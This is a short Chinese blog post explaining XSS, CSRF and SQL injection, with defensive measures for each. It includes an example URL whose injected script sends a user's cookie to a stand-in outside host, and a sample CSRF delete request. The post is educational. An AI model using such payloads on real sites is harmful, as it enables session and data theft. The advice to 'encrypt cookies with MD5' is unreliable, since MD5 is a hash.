---
title: "XSS、CSRF与SQL注入"
date: 2017-03-24 08:37:00
cover: "2.jpg"
category: "前端"
tags:
    - JavaScript
    - 前端安全
---
>关于Web安全的内容经常会被问到。前端主要关注的是XSS与CSRF，而以前曾经见过SQL注入，这里一并总结一下。仅为理解概念。

<!--more-->
# XSS与CSRF
## XSS
### 什么是XSS
XSS即Cross Site Script，跨站脚本攻击。

原理是利用网站中提供的输入入口，如表单等，恶意输入一些可执行的恶意代码，如果服务器对原始输入数据不加处理，这些恶意代码就可能会被当做正常代码被执行。

理论上，所有可输入的地方都可能存在XSS漏洞。

#### DOM Based XSS
XSS分为两种，一种是单会话中，通过在URL中添加某些脚本语句，来获得受害人的一些信息。这种攻击局限于DOM内，因此叫做DOM Based XSS。

一个简单易懂的例子：
```
http://www.a.com?content=<script>window.open("www.b.com?param="+document.cookie</script>
```
很多站点，页面内容依赖URL传递，这种站点就容易被XSS攻击。因为一旦URL包含了某些可执行脚本，它就会被解析称为DOM脚本的一部分进行执行。上例中，如果一个登录到a站点的用户点击了该链接，那么包含他登录信息的cookie就会随着`window.open`发给b站点的HTTP请求被发送到b站。
这样b站点就盗取了用户在a站点的登录信息。

#### Stored XSS
这种方式的攻击是，恶意用户通过某种方式将恶意代码存储在服务器上（订阅源）。比如发布一篇带有恶意代码的网络日志，则所有访问该日志的用户都可能被盗取信息。

常见的例子就是钓鱼网站。

### 怎样防范XSS
1. 输入过滤  
  就是不接受用户输入的原始文本内容，而对它们进行编码。比如：
  * <: `&lt;`
  * \>: `&gt;`
  * &: `&amp;`
  * ": `&quot;`
  * 空格: `&nbsp;`
  * ASCII字符: `&#<number>`
  * 关键字：`script`、`javascript`等
2. 输出编码  
  不要在URL中显示用户信息；在需要将用户信息输出到页面中时，使用HTML Encoder编码再输出。   
3. Cookie防盗
  * 用MD5等方法对Cookie加密
  * 对cookie进行IP绑定
  * 让cookie在`document`对象中不可见。设置cookie参数`HTTPOnly`
  * 注意设置`HTTPOnly`只能阻止对cookie的读，并不能阻止对cookie的写

## CSRF
### 什么是CSRF
CSRF即Cross-site request forgery，跨站请求伪造。

盗用用户身份，并以用户身份发送请求。

当用户登录正规站点a后，访问恶意站点b，b就可能模拟用户操作，私自访问a站。比如通过：
```
http://a.com/comment/?type=delete&id=123
```
就可以删除用户在a站的信息。

### 怎样防范CSRF
1. 验证码
  在用户的关键操作上加验证码
2. Session id/Token
  对用户请求添加服务器与客户端协商过的唯一id，在用户发表单时带上这个id以验证身份。

# SQL注入
如果后台数据库操作代码，直接使用用户输入的字符串参数来拼接SQL查询语句，那么就可能存在SQL注入。因为用户的输入将直接作为SQL语句的一部分，如果用户输入了一些SQL语句，那么这些语句将会被查询。

详细请见：[SQL注入攻防入门详解](http://www.cnblogs.com/heyuquan/archive/2012/10/31/2748577.html)
